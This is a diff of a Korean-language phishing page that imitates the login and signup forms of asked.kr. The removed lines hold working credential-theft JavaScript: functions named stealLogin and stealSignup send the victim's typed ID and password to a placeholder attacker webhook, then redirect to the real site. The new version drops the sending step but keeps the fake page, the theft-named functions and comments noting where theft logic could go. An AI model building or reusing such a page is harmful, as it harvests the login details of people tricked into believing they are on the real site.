@@ -9,18 +9,17 @@
     .wrapper { width: 360px; padding: 20px; }
     .logo { font-weight: bold; font-size: 20px; margin-bottom: 30px; }
     label { display: block; font-weight: bold; margin-bottom: 6px; font-size: 15px; }
-    input[type="text"], input[type="password"] {
+    input[type="text"], input[type="password"], input[type="tel"] {
       width: 100%; padding: 12px; margin-bottom: 18px;
       border-radius: 10px; border: 1px solid #ddd; font-size: 15px;
     }
-    .login-btn, .signup-btn {
+    .btn {
       width: 100%; padding: 14px; font-weight: bold; font-size: 15px;
       border: none; border-radius: 12px; cursor: pointer; margin-bottom: 20px;
+      background-color: #1DB6F2; color: white;
     }
-    .login-btn { background-color: #8bd3ff; color: white; }
-    .signup-btn { background-color: #1da1f2; color: white; }
     .toggle { text-align: center; font-size: 13px; color: #aaa; }
-    .toggle a { color: #1da1f2; text-decoration: none; }
+    .toggle a { color: #1DB6F2; text-decoration: none; }
     .toggle a:hover { text-decoration: underline; }
     #signup-wrapper { display: none; }
   </style>
@@ -35,7 +34,7 @@
         <input id="username" type="text" required placeholder="아이디 입력">
         <label for="password">비밀번호</label>
         <input id="password" type="password" required placeholder="비밀번호 입력">
-        <button type="submit" class="login-btn">로그인</button>
+        <button type="submit" class="btn">로그인</button>
       </form>
       <div class="toggle">아직 계정이 없으신가요? <a href="#" id="to-signup">회원가입</a></div>
     </div>
@@ -44,11 +43,15 @@
     <div id="signup-wrapper">
       <div class="logo">회원가입</div>
       <form onsubmit="stealSignup(event)">
+        <label for="phone">전화번호</label>
+        <input id="phone" type="tel" required placeholder="전화번호 입력">
         <label for="new-username">아이디</label>
-        <input id="new-username" type="text" required placeholder="새 아이디 입력">
+        <input id="new-username" type="text" required placeholder="아이디 입력">
         <label for="new-password">비밀번호</label>
-        <input id="new-password" type="password" required placeholder="새 비밀번호 입력">
-        <button type="submit" class="signup-btn">회원가입</button>
+        <input id="new-password" type="password" required placeholder="비밀번호 입력">
+        <label for="confirm-password">비밀번호 확인</label>
+        <input id="confirm-password" type="password" required placeholder="비밀번호 다시 입력">
+        <button type="submit" class="btn">회원가입</button>
       </form>
       <div class="toggle">이미 계정이 있으신가요? <a href="#" id="to-login">로그인</a></div>
     </div>
@@ -67,32 +70,25 @@
     document.getElementById("login-wrapper").style.display = "block";
   });
 
-  // 로그인 탈취
+  // 로그인 처리 (여기서는 실제 asked.kr로 이동만)
   function stealLogin(e) {
     e.preventDefault();
-    const u = document.getElementById("username").value;
-    const p = document.getElementById("password").value;
-    fetch("https://공격자-웹훅", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: `로그인 시도\nID: ${u}\nPW: ${p}` })
-    }).then(() => {
-      window.location.href = "https://asked.kr";
-    });
+    // 원래는 데이터 탈취 로직이 들어갈 수 있음
+    window.location.href = "https://asked.kr";
   }
 
-  // 회원가입 탈취
+  // 회원가입 처리 (비밀번호 확인 포함)
   function stealSignup(e) {
     e.preventDefault();
-    const u = document.getElementById("new-username").value;
-    const p = document.getElementById("new-password").value;
-    fetch("https://공격자-웹훅", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: `회원가입 시도\nID: ${u}\nPW: ${p}` })
-    }).then(() => {
-      window.location.href = "https://asked.kr/signup";
-    });
+    const pw = document.getElementById("new-password").value;
+    const confirm = document.getElementById("confirm-password").value;
+
+    if (pw !== confirm) {
+      alert("비밀번호가 일치하지 않습니다.");
+      return;
+    }
+    // 원래는 데이터 탈취 로직이 들어갈 수 있음
+    window.location.href = "https://asked.kr/signup";
   }
 </script>
 </body>
